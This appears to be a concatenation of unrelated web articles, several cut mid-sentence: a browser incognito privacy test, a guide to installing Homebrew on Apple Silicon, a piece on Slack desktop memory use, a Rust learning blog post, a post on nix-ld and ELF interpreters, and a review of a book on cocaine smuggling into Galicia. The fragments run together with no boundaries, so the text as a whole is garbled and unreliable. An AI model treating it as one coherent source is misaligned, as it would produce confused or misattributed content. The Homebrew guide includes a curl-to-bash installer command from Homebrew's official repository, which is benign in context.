pay for equal work.</p><figure><blockquote><div lang="en" dir="ltr"><p>Where you live is a consumption choice.

If your browser is secure/private – that input should <strong><em>not</em></strong> be remembered in a different session/tab/window/incognito mode etc.</p><h2>Disclaimer</h2><ul><li>For browsers such as DuckDuckGo and FireFox, which had special options to clear/burn all history and data, we used them in the test.</li><li>Brave and Vivaldi did not allow taking screenshots in the Incognito Mode, so we’ve taken screenshots in the normal mode but you can try it out in any mode you want, even mix it up.</li><li>We tried with restarting each browser too, hoping that would at least help pass this.</li><li>Please feel free to try it again with any browser any way you like. Let us know if you find other results.</li></ul><h2>Let’s get into it!</h2><h3>Firefox Focus</h3><figure><img src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1024x448.png" data-src="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1024x448.png" alt="Firefox privacy fail" data-srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-50x22.png 50w" data-sizes="(max-width: 1024px) 100vw, 1024px" srcset="https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1024/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1024x448.png 1024w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_300/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-300x131.png 300w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_768/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-768x336.png 768w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1536/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1536x672.png 1536w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_2048/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-2048x896.png 2048w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1160/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1160x508.png 1160w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_114/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-114x50.png 114w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_650/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-650x284.png 650w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_1000/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-1000x438.png 1000w, https://cdn.shortpixel.ai/client/q_lossy,ret_img,w_50/https://snapsearch.online/wp-content/uploads/2020/11/firefoxfocus_test_fail-50x22.png 50w"><figcaption>Firefox Focus Failed</figcaption></figure><p>Launched as the super privacy focused version of Firefox, which is anyways popular for being private.

      <h2><a href="https://soffes.blog/homebrew-on-apple-silicon">Homebrew on Apple Silicon</a></h2>
      <p>Posted on <time datetime="2020-11-17T00:00:00Z">November 17, 2020</time></p>
    </header>
    <p>Today, my new 13-inch MacBook Pro arrived! I was super excited to get it out of the box and set it up. This thing is fast! I am already very impressed. When I started setting up my development environment, things started to get a little frustrating. Have no fear, it’s solvable!</p>

<p>The biggest issue for me was <a href="https://brew.sh/" target="_blank" rel="noopener">Homebrew</a>. According to <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank" rel="noopener">this issue</a> “There won’t be any support for native ARM Homebrew installations for months to come.” No big deal though. <mark>Homebrew can work just fine with Rosetta 2</mark> and some things work natively.</p>

<h2>Using Rosetta 2</h2>

<p>Rosetta 2 is Apple’s translation later. This lets you run Intel things with a little overhead. In Terminal, you can run any process with Rosetta by prefixing it with <code>arch -x86_64</code>.</p>

<p>To get Homebrew working, let’s install it using Rosetta:</p>
<pre>$ arch -x86_64 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)"
</pre>
<p>This command is the standard installer from <a href="https://brew.sh/" target="_blank" rel="noopener">brew.sh</a> with the Rosetta prefix. This will setup Homebrew in <code>/usr/local</code>. Now whenever you want to interact with it, you can run <code>arch -x86_64 brew …</code>. Easy enough!</p>

<p>If you want to wait for official support for Apple Silicon, feel free to stop reading here.</p>

<h2>Multiple Homebrews</h2>

<p>Homebrew does sorta work on Apple Silicon. See <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank" rel="noopener">this issue</a> for the current status. OpenJDK and Go don’t work as of this writing and that blocks a lot of things. I was able to get Postgres, Redis, ImageMagick, rbenv, etc. all working natively though! To do this, you’ll need a second Homebrew.</p>

<p>Homebrew for Apple Silicon is expected to be installed in <code>/opt/homebrew</code> instead of the <code>/usr/local</code> you’re expecting. Let’s get that set up:</p>
<pre>$ sudo mkdir -p /opt/homebrew
$ sudo chown -R $(whoami):staff /opt/homebrew
$ cd /opt
$ curl -L https://github.com/Homebrew/brew/tarball/master | tar xz --strip 1 -C homebrew
</pre>
<p>This creates a new directory, setups the right permissions, and downloads Homebrew.</p>

<p>Be sure to add <code>/opt/homebrew/bin</code> to your <code>$PATH</code>!</p>

<p>Whichever <code>brew</code> is in your path first will run when you use <code>brew</code>. If it’s the <code>/usr/local</code> one, you’ll need to add the <code>arch -x86_64</code> prefix every time. Your best bet for using both is to alias one of them.</p>

<p>I made sure <code>/opt/homebrew/bin</code> was in my path <strong>before</strong> <code>/usr/local/bin</code>. Then I aliased the Intel <code>brew</code> to <code>ibrew</code> so it’s easier to select. Here’s what I added to my ZSH configuration:</p>
<pre>export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"
alias ibrew='arch -x86_64 /usr/local/bin/brew'
</pre>
<p>Now you can easily run <code>brew</code> to get the native one or <code>ibrew</code> to get the Rosetta one. You could of course do this in the other order in your <code>$PATH</code> if you prefer and something like <code>abrew</code> (for Apple Silicon Homebrew) or whatever else.</p>

<p>If you install things in both Homebrews, the one that is first in your path will be used.</p>

<p><strong>Disclaimer:</strong> This is as of 2020-11-17. Things are surely going to change. Follow along in <a href="https://github.com/Homebrew/brew/issues/7857" target="_blank" rel="noopener">this issue</a> for the latest from the Homebrew team.</p>

<p><strong>Update 2020-11-18:</strong> I realized both at the same time wasn’t working as I described. Updated the multi section.</p>

It's flagship product is the extended chat service that aims to improve communication. The enhanced chat application with APIs for integrations with third party tools has seen immense success from startups with a handful of folk to enterprises like Blackberry, Bloomberg and VMWare adopting the communications tool at scale.</p><p>The messaging traffic going through this SaaS is incredibly large and the company has been able to keep it's<!-- --> <a href="https://slack.engineering/taking-php-seriously-cf7a60065329">PHP powered backend</a>&nbsp;chugging along fine under huge load reliably with<!-- --> <a href="https://stackshare.io/slack/slack">it's tech stack</a>. This is a critical area, because people will abandon a real time messaging plaform that is not… real time. Slack has done a good job scaling it's backend. Judging by popularity the team has excelled elsewhere as well.</p><p>A chat platform is only as good as it's client apps. In the contemporary working environment a number of devices are used on and off, and many people expect to be able to access Slack and other services from their desktops as well as mobile devices. Chats are increasingly being used as interfaces to other tools, as casual collaborative tasks like user generated content approvals are <a href="https://www.youtube.com/watch?v=3DTe6pDCx1w&amp;feature=youtu.be">done through API driven chatbots</a>.</p><p>The corporate chat arena is competitive — both the delivery service and the apps need to be top notch.</p><h2>Mem's the word</h2><p>The mobile apps for Android and iOS devices&nbsp;are generally regarded to be of high quality and you rarely hear negative feedback from them. In the desktop things are different. The main issue is the memory use by the clients, something the company itself has paid attention to:</p><blockquote>However, these capabilities come at a cost: the desktop client can use a lot of memory. This memory footprint increases as the user signs into more teams, as each team runs in its own webview.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Hello and welcome to the fifth post in my series about learning Rust. In case you want to hit it from the start, <a href="https://levpaul.com/posts/rust-lesson-1/">here’s</a> a link to the first one! This entire series covers my journey from being a completely land-locked Gopher to becoming (hopefully) a hardened Rustacean, able to skitter the hazardous seabed of any application safely.</p><hr><p>I can’t believe we’re at post number five! It’s been a wonderful ride, and I’ve been blown away by the helpful feedback from the Rust community at large. Thank you to everyone for all of the warm help.</p><p>Whilst I’m still in my infancy with Rust, it’s getting harder and harder to hold the itch to learn more. Often I want nothing more than to open the Rust Book and truck on with learning, blog posts be darned! However, I’ve made my commitment to myself, you and the Book, so every night; write, I do.</p><p>I’ve decided to make this post a <em>triple</em>, so let’s begin where we left off!</p><h3 id="7-packages-and-crates-and-stuffhttpsdocrust-langorgbookch07-00-managing-growing-projects-with-packages-crates-and-moduleshtmlmanaging-growing-projects-with-packages-crates-and-modules">7. <a href="https://doc.rust-lang.org/book/ch07-00-managing-growing-projects-with-packages-crates-and-modules.html#managing-growing-projects-with-packages-crates-and-modules">Packages and Crates and Stuff</a></h3><p>Right off the bat, I think this chapter is very well-placed. Even though it took me the entire chapter <em>grok</em> crates, modules and packages; I don’t think it came a line too early or late. Bravo! The chapter introduced many new keywords, such as <code>use</code>, <code>pub</code>, <code>mod</code>, <code>super</code>, but you walk away feeling like you can actually use them properly.</p><h4 id="modules">Modules</h4><p>Modules are introduced leaning heavily on the analogy of a file system… Now given that modules, at the most granular level, can be defined as single files <em>with the module name</em>, I’m actually wondering how much of this <em>is an analogy</em> and how much of it is really what’s happening at the compiler level. I would grin so hard if the bit about <strong><code>use</code></strong> being <em>like</em> a symlink <em>was</em> actually just a thing that was happening somewhere in the build chain. I’m sure it’s not though… Right.</p><h4 id="privacy">Privacy</h4><p>I enjoyed how the authors talked about privacy through scope. It helped me link project structure ideas with programming rules. For some reason I always thought of privacy as logical rules applied to code after the fact, rather than just having or not having something within a certain scope. It’s a lot easier to think about the later way. All this being said, there was also an overarching “Restaurant” example which they tried to tie in with privacy - check this gem:</p><blockquote><p>The way privacy works in Rust is that all items (functions, methods, structs, enums, modules, and constants) are private by default. […] To continue with the restaurant metaphor, think of the privacy rules as being like the back office of a restaurant: what goes on in there is private to restaurant customers, but office managers can see and do everything in the restaurant in which they operate.</p></blockquote><p>… I think that metaphor died somewhere in the rafters above the restaurant, and the smell could be starting to affect the food. Sorry.</p><p>For those who don’t know, privacy in Go is defined by whether you capitalize the first letter of your func/struct/interface name. Whilst lean and consistent - I much prefer the Rust approach. Rust is private by default unless you plop a <code>pub</code> in front of it. The main irk I have with the Go way is that Go’s naming convention also tells you acronyms should be entirely uppercase. So what happens when you want a private struct called <code>jsonData</code>? Well you have to think of something else because calling it <code>JSONData</code> will make it publicly exported and <code>jsonData</code> is not idiomatic. It’s definitely but only a nit, however I’ve become (unreasonably?) irked by it on more than one occasion.</p><h5 id="clean-your-room">Clean your room!</h5><p>The lesson proved once again that the Rust compiler is helpful. Gentle warnings about my variables being unused really makes me feel cared for. Go isn’t like this. Go grabs you by your collar and pierces your eardrums with a shrewd screech. It won’t let you go either. Like a harpy, the tiny chipmunk won’t let up. Thank Crabby for small mercies is all I can say.</p><p>On a more serious note though, I like this choice by Rust - my preference for most things I’d code would be to enforce compiler errors for unused variables; but it should be a compiler option; which as far as I know - it is <strong>not</strong>, in Go. I’m going to guess you should be able to upgrade the Rust warnings to errors through compiler flags somehow.</p><h5 id="re-exporting-imports">Re-exporting Imports</h5><p>This <a href="https://doc.rust-lang.org/book/ch07-04-bringing-paths-into-scope-with-the-use-keyword.html#re-exporting-names-with-pub-use">feature</a> of Rust gives me mixed feelings. As I understand it, when you <code>use</code> a package, that package can then bring more packages into your scope? I mean it does make sense from a library user-experience perspective, but I can’t help but feel like there’s a bit of trust going on here, if not only taste-trust. It’s definitely nice to just <code>use</code> a crate once and have everything you need to interact with it.</p><p>There’s only one Rust project I’m really interested in right now - a Game engine and editor called <a href="https://github.com/mrDIMAS/rg3d">rg3d</a>. I checked that project’s source for re-exports and found some in the top level <a href="https://github.com/mrDIMAS/rg3d/blob/master/src/lib.rs"><code>lib.rs</code></a>. Basically it just imports its own submodules publicly. I have no idea if this is idiomatic but to my lay-eyes this use-case looks correct and just.</p><p>Rust has been giving me a strong Java vibe from its imports. The nested paths feature seems good - ugly but succinct. Maybe my editor or <code>rustfmt</code> will automatically manage this for me? I enjoy not needing to worry about imports 99% of the time in Go, thanks to <code>goimports</code>, so hopefully that trend will continue in Rust.</p><h5 id="prelude-to-nothing">Prelude to Nothing</h5><p>In previous posts I mentioned being wooed by wistful mentions of a <code>prelude</code> by the Book. Well this chapter mentioned it again, and more than wistfully. It drowned my unquenchable satiety with <a href="https://doc.rust-lang.org/std/prelude/index.html">this link</a>, which to my utmost sorrow, was not a chapter in the Book. Alas, I read it in spite the fact. Oh, but my heart was flattened like my toddler’s playdough on a Sunday morning, for I was to find <strong>the prelude</strong> means nothing more than the default set of imports for a program. Through the sobriety of hindsight, I do question what else I was expecting. Given Rust doesn’t have a runtime, it doesn’t need anything fancy. Oh well, at least the great prelude mystery is solved.</p><h3 id="8-common-collectionshttpsdocrust-langorgbookch08-00-common-collectionshtml"><a href="https://doc.rust-lang.org/book/ch08-00-common-collections.html">8. Common Collections</a></h3><p>I just want to take a moment to swoon over Rust’s type inference again.</p><p>*<em><strong>swoons</strong></em>*</p><p>It’s fantastic. This is all…</p><hr><p>Now for actual chapter 8; it’s fairly dense. Covered is a brief introduction of standard library’s collections, Vectors, HashMaps and finally a deep dive into Rust Strings. Let’s begin the blow-by-blow starting with this gem:</p><div><pre><code data-lang="rust"><span>fn</span> <span>main</span><span>()</span><span> </span><span>{</span><span>
</span><span>    </span><span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>1</span><span>,</span><span> </span><span>2</span><span>,</span><span> </span><span>3</span><span>,</span><span> </span><span>4</span><span>,</span><span> </span><span>5</span><span>];</span><span>
</span><span>    </span><span>let</span><span> </span><span>first</span><span> </span><span>=</span><span> </span><span>&amp;</span><span>v</span><span>[</span><span>0</span><span>];</span><span>
</span><span>    </span><span>v</span><span>.</span><span>push</span><span>(</span><span>6</span><span>);</span><span>
</span><span>    </span><span>println</span><span>!</span><span>(</span><span>"The first element is: {}"</span><span>,</span><span> </span><span>first</span><span>);</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>Guess what won’t compile? Correct - the code above! What’s happening here is that <code>v</code> is mutable and <code>first</code> is immutable. If <code>v</code> needs to grow from something like a push; then this may end up moving the entire heap-allocated vector into another part of the heap. Had this to happen, then <code>first</code> would be a “dangling” ref to what <em>used</em> to be the first element of <code>v</code>.</p><p>Now what really tickles me is wondering about how that enforcement is encoded - what is <code>first</code> a reference to exactly? The Vec? No, my IDE tells me it’s an <code>&amp;i32</code> ref… But, somehow the compiler knows that <em>THAT</em> i32 ref is a child, or related to the Vec in the same scope. I
’d love to know more about how this works.</p><p>Perhaps not by major coincidence the Book offers up possibly the most perfect lead for such questions only paragraphs later… The Book introduces the <a href="https://doc.rust-lang.org/nomicon/vec.html">Rustinomicon</a>, telling us that we can peer into it to see details about how <code>vec</code> is made… At first, I was a little tense. Why does this reference-style-looking book have the Lovecraftian name? Only when I glimpsed the first line of its opening, did the ink droplets align:</p><h3 id="the-dark-arts-of-unsafe-rust"><code>The Dark Arts of Unsafe Rust</code></h3><p>…<em>followed by</em></p><p>THE KNOWLEDGE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF UNLEASHING INDESCRIBABLE HORRORS THAT SHATTER YOUR PSYCHE AND SET YOUR MIND ADRIFT IN THE UNKNOWABLY INFINITE COSMOS.</p><h4 id="okay-this-looks-awesome"><strong>OKAY THIS LOOKS AWESOME</strong>.</h4><p>Flipping back to the <code>vec</code> chapter of the Rustinomicon, I realised it’s not at all a boring appendix style libdoc for vectors - the god damn tomb is teaching you to write your <em>OWN</em> std::Vec from scratch!</p><p>Good God, this is made me bite my lip in awkward nuclear attraction. I had some plans in mind for what I wanted to write about after this series. Right now the thought of doing a mini-series through the nomcon is sounding mighty fine though.. <em>More to come on this later</em>, as I managed to pry myself away and back to the lesson at hand.</p><hr><p>Looking through the method list (by god the <a href="https://doc.rust-lang.org/std/vec/struct.Vec.html">doc pages</a> are ugly; hint - only use the sidebar to navigate, do not bother free-scrolling), <code>vec</code> REALLY has some cool funcs. <code>dedup</code>, <code>drain</code>, <code>retain</code> all look to do what you’d expect. I jaunted quickly through <a href="https://doc.rust-lang.org/std/iter/trait.Iterator.html"><code>std::iter:Iterator</code></a> too and found SO many nice to haves, such as <code>gt</code>, <code>is_sorted</code>, <code>map</code>, <code>fold</code>, <code>filter</code>…</p><p>Seriously, I know there’s a lot you wouldn’t need here - but I really do wish we had simple collections/traits outside of slices and maps in Go. And yes, before I get screamed at - <em>I know</em> you can write your own in <a href="https://gobyexample.com/collection-functions">a few lines</a>, but it’s not the same - especially when you start involving complex data types. Being able to just conform to standard interfaces for elegance is something I adore and miss.</p><h4 id="string-theory">String Theory</h4><p>The chapter devotes a large swath to Strings and UTF-8. At first, I thought “how boring”, but then I realised I am the boring one! This is a much more interesting problem than I gave credit for and it made me go back to Go to better understand the “rune” system it uses for strings.</p><p>First, strings; there’s actually shit-loads of them in Rust… <code>OsString</code>, <code>CString</code>, <code>CStr</code>, <code>OsStr</code>… How wrong I was to assume a single String type in Rust indeed.</p><p>The stdlib provides many helpful functions over regular <code>String</code>. In Go, string is a part of <code>builtin</code>, but you use the stdlib’s <code>strings</code> package for more helpers.</p><hr><p><strong>Random question</strong>: Is there a difference between <code>String::from("")</code> and <code>String::new()</code>? According to this test; no:</p><div><pre><code data-lang="rust"><span>    </span><span>assert_eq</span><span>!</span><span>(</span><span>true</span><span>,</span><span> </span><span>String</span>::<span>from</span><span>(</span><span>""</span><span>)</span><span> </span><span>==</span><span> </span><span>String</span>::<span>new</span><span>());</span><span>
</span></code></pre></div><p>I’ve seen both methods being used so far and am not sure which one is “better”/idiomatic.</p><h4 id="indexing-into-strings">Indexing into Strings</h4><blockquote><p>A final reason …</p></blockquote></div></div>

<p><strong>Can we do better &amp; streamline running non-Nix software?</strong> 🤔</p>

<p>This was some of the questions posed by some Nix contributors and I wanted to capture the ideas put forward for others.</p>

<!--more-->

<h2 id="a-brief-tour-of-linking">A brief tour of linking</h2>

<p>Without going into a ton of detail about how dynamic libraries are performed on Linux; a Linux binary - <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format">ELF format</a> - contains information pertaining to the dynamic libraries necessary for the binary.</p>

<p>For instance, here is a non-NixOS Ruby installation.</p>
<div><div><pre><code>❯ readelf <span>-d</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>NEEDED
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libruby-2.7.so.2.7]
 0x0000000000000001 <span>(</span>NEEDED<span>)</span>             Shared library: <span>[</span>libc.so.6]
</code></pre></div></div>
<p>It requires two dynamic libraries <em>libruby</em> &amp; <em>libc</em>. These libraries may themselves have other dependencies, so we can use <strong>ldd</strong> to recursively find the dependency closure.</p>

<div><div><pre><code>❯ ldd <span>$(</span>which ruby<span>)</span>
    linux-vdso.so.1 <span>(</span>0x00007ffed1705000<span>)</span>
    /lib/x86_64-linux-gnu/libnss_cache.so.2 <span>(</span>0x00007f3626cd0000<span>)</span>
    libruby-2.7.so.2.7 <span>=&gt;</span> /lib/x86_64-linux-gnu/libruby-2.7.so.2.7 <span>(</span>0x00007f3626960000<span>)</span>
    libc.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libc.so.6 <span>(</span>0x00007f362679b000<span>)</span>
    libpthread.so.0 <span>=&gt;</span> /lib/x86_64-linux-gnu/libpthread.so.0 <span>(</span>0x00007f3626779000<span>)</span>
    librt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/librt.so.1 <span>(</span>0x00007f362676e000<span>)</span>
    libgmp.so.10 <span>=&gt;</span> /lib/x86_64-linux-gnu/libgmp.so.10 <span>(</span>0x00007f36266eb000<span>)</span>
    libdl.so.2 <span>=&gt;</span> /lib/x86_64-linux-gnu/libdl.so.2 <span>(</span>0x00007f36266e3000<span>)</span>
    libcrypt.so.1 <span>=&gt;</span> /lib/x86_64-linux-gnu/libcrypt.so.1 <span>(</span>0x00007f36266a8000<span>)</span>
    libm.so.6 <span>=&gt;</span> /lib/x86_64-linux-gnu/libm.so.6 <span>(</span>0x00007f3626564000<span>)</span>
    /lib64/ld-linux-x86-64.so.2 <span>(</span>0x00007f3626cde000<span>)</span>
</code></pre></div></div>

<p>We can see here that <strong>ldd</strong> resolved the libraries to locations in my <a href="https://en.wikipedia.org/wiki/Filesystem_Hierarchy_Standard">Filesystem Hierarchy Standard</a>(FHS).</p>

<p>This is <em>not hermetic</em>, as the FHS is a global shared state across my machine.
This is the exact problem that Nix itself wants to address.</p>

<blockquote>
  <p>I’m on a Debian distro at the moment.</p>
</blockquote>

<p>Nix addresses this generally by patching the ELF header to <em>fully specify</em> where the shared libraries can be found in the <em>/nix/store</em>; so that they are not resolved or searched on the FHS.</p>

<div><div><pre><code>❯ readelf -d $(which ruby) | grep RUNPATH
 0x000000000000001d (RUNPATH) Library runpath:
 [/nix/store/z5lira1853d97gbmv1qbdjjpkjn7ksj8-ruby-2.6.6/lib:
 /nix/store/8fcxqg8dmwlkjw2vgkgz607kr5jy552w-zlib-1.2.11/lib:
 /nix/store/kah5n342wz4i0s9lz9ka4bgz91xa2i94-glibc-2.32/lib]
</code></pre></div></div>

<p>This <em>patching</em> however relies on the Nix <em>stdenv</em> derivation builder and ultimately is what makes binaries in Nix work.</p>

<blockquote>
  <p>Nix actually takes it a step further and patches the linker so that it does not even try to check the FHS.</p>
</blockquote>

<p>Binaries downloaded from the Internet are not patched. What can be done?</p>

<h2 id="interpreter">Interpreter</h2>

<p>A key insight into the bootstrapping of an ELF binary in Linux is the <em>interpreter</em>, whose presence is there to help satisfy any dynamic linkage.</p>

<p>Let’s take a look again at my non-Nix Ruby binary</p>

<div><div><pre><code>❯ readelf <span>-l</span> <span>$(</span>which ruby<span>)</span> | <span>grep </span>interpreter
      <span>[</span>Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
</code></pre></div></div>

<blockquote>
  <p>Nix built binaries use a <a href="https://github.com/NixOS/patchelf">patchelf</a> utility that not only sets the <em>RUNPATH</em> to pin libraries but also changes the interpreter to one in the <em>/nix/store</em></p>
</blockquote>

<p>It is the interpreter’s goal to find the libraries listed in the ELF file either via the <em>RUNPATH</em>, <em>LD_LIBRARY_PATH</em> or the <em>FHS</em> well known directories.</p>

<p>⚠️ On NixOS <code>/lib64/ld-linux-x86-64.so.2</code> normally <strong>does not exist</strong> and as a result you will be greeted with an unfriendly <em>“bad ELF interpreter: No such file or directory”</em> error.</p>

<h2 id="nix-ld">nix-ld</h2>

<p>We have a binary that needs some shared libraries &amp; the bootstrapping process calls out to the interpreter set in the ELF header.</p>

<p>💡 Let’s put a <em>fake</em> interpreter on NixOS machines!</p>

<blockquote>
  <p>This idea works since the path of Linux <em>ld</em> is well known for each distribution.</p>
</blockquote>

<p>For instance, NixOS machines can place an entry at <em>/lib64/ld-linux-x86-64.so.2</em> for a custom binary that can help resolve dynamic libraries <strong>at runtime</strong> to libraries within the <em>/nix/store</em>.</p>

<p>This is in fact what <a href="https://github.com/Mic92">Mic92</a> has started with his project <a href="https://github.com/Mic92/nix-ld">nix-ld</a>.</p>

<p>How can our custom <em>ld</em> locate the necessary libraries though? This is where we can get really crazy. 🤪</p>

<p>We can use <a href="https://github.com/bennofs/nix-index">nix-index</a> – a files database for nixpkgs – to locate packages in Nix that provide the necessary library. 🤯</p>

<p>The packages can be realized on-demand onto the host and their <em>/nix/store</em> entry can then be included into the <em>LD_LIBRARY_PATH</em> environment variable set when handing off to the <em>real ld</em>.</p>

<blockquote>
  <p>If gc-roots are set for the required libraries, this determination can then be cached for a given binary.</p>
</blockquote>

<p>Fancier best-effort matching on picking packages that have the highest % of required symbols could also be done.</p>

<p>It seems kind of crazy that just picking random packages from the <em>nix-index</em> would ultimately let us run the binary; except that is how traditional software in Linux normally works! 😱</p>

<p>At worst it is providing the same experience users typically experience on non-NixOS distributions but giving a gentler onboarding for people as they see the Nix-light 😇</p>

November 17, 2020 | https://www.ebb-magazine.com/essays/snow-on-the-atlantic | <a href="https://web.archive.org/web/*/https://www.ebb-magazine.com/essays/snow-on-the-atlantic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-block-type="2" id="block-00c327a0e80805b65a15"><div><p>At the beginning of Alfred W. McCoy’s seminal work on the global heroin trade and the CIA, <em>The Politics of Heroin</em>, he gives us a simple formulation that’s useful for any study of illicit drugs and their trade: ‘Narcotics are not simply illegal and immoral,’ he writes. ‘They are the source of extraordinary profits and power.’ Part of the power of McCoy’s book is that he writes about his subject so thoughtfully, and eschews the sensationalism that characterizes too much writing about drugs and their traffic. ‘Simply put, narcotics are major global commodities that resist any attempt at localized suppression… As long as demand for drugs in the cities of the First World continues to grow, Third World producers will find a way to supply their markets.’</p><p>Nacho Carretero’s <em>Snow on The Atlantic, How Cocaine Came to Europe</em>, published in a translation by Thomas Bunstead in 2018 by Zed Books, is a contribution to telling the story of one of these global commodities: cocaine. It tells a tale of Galicia and its Costa Del Morte, that region in Spain sitting on top of Portugal with 930 deadly miles of coastline and an adventurous history of shipwrecks and pirates and smuggling. This book focuses on the colorful tale of how Galicia became the port for cocaine smuggling in Europe, largely through an alliance between the Medellín Cartel in Colombia and a homegrown smuggling culture and network of clans. It’s packed with characters and schemes and police operations, but one flaw is that it falls into their sensationalism too often (a <a href="https://www.antena3.com/series/farina/">popular television series</a> in Spain was based on the book), and its major failing is in not making much of an attempt to analyze the phenomenon more deeply. The details in the book, however, make great raw material for a more developed analysis down the line.</p><p>Here is a sketch of the story that Carretero tells: it begins in earnest after the Spanish Civil War, in that inter-border region between Spain and Portugal called the <em>Couto Mixto</em>. Carretero goes as far as to say the area is characterized by a ‘statelessness.’ Not so long ago, as recently as the nineteenth century, if you asked villagers in the area what country they were citizens of they couldn’t tell you. The Spanish Civil War defined these borders. And those borders made nations become as classes; the living standard in Portugal was high, while in Spanish Galicia much of the rural inhabitants lived in relative and real poverty. It was the difference, Carretero writes, ‘between one group of people who were starving, and another enjoying the spoils of African colonies.’ This was something I wish Carretero had expanded on: what was the licit economy in Galicia and why did its people live worse? On that he gives no real answer, though he does describe how some local fortunes were made from tungsten sold to the Third Reich during the Second World War.</p><p>Whatever the reasons for this poverty, the relative affluence of Portugal right across the border made Galicia a prime location for smuggling of all sorts of things. It was cigarettes which became the big money maker. Smugglers cut deals with the big guys like Reynolds &amp; Philip Morris in America to move excess production and faulty batches, dodging gargantuan amounts of taxes, and altering the flow of goods from up from Portugal to across the Atlantic. That route would define the traffic later when cocaine started coming from Colombia.&nbsp;</p><p>The law helped too. Until 1982 all you could get for smuggling was a caution. Before 1978 smuggling was only an economic offence. With the Customs Surveillance Service (SVA) enforcing the weak laws, smugglers rarely went to jail – at most they’d get a fine, and that would often be lost in the Minoan bureaucratic system of the new democratic state post-Franco.</p><p>Carretero describes a society where the lumpen ruled each class strata, not just a lumpen-proletariat but a lumpen-petty bourgeois and a lumpen bourgeoisie. ‘There was nothing abnormal about the sight of smugglers and <em>guardias</em> sharing a tumbler of wine over a game of dominos in the local tavern.’ He explains further that smugglers and police would often have agreements that let the smuggling pass unmolested, provided the police got their cut: ‘From the beginning, the relationship with the <em>Guardia Civil </em>was good. Those in the pay of the government were as hard up as everyone else, and it was almost always them who proposed the pacts.’</p><p>Police in on the take isn’t unprecedented or uncommon. More interesting are the connections Carretero details between the smugglers and the political class. When I mention smugglers, I’m referring not just to the later drug traffickers but also the ‘smoke lords’ who developed their expertise and reputation moving cigarettes. They provided the perfect resource for the cartels to exploit later when they saw the talent and culture that existed in Galicia. These mafia-like clans were generous contributors to all political parties in the region, particularly the institutional right-wing parties like the <em>People’s Alliance</em> (AP), which later became the <em>Partido Popular</em> (PP). That party had numerous links to the smugglers, from campaign contributions to friendships, to particularly salient connections through the Galician Chamber of Commerce, of which many smugglers and their associates were members at one time or another. That extended to the auxiliaries of the narcotics trade – lawyers like Pablo Vioque who defended the smugglers in their inevitable run-ins with the law.</p><div><p>How the shift to drug smuggling was made is murky. Someone bought hashish once from Africa and knew one of the <em>Capos</em>. 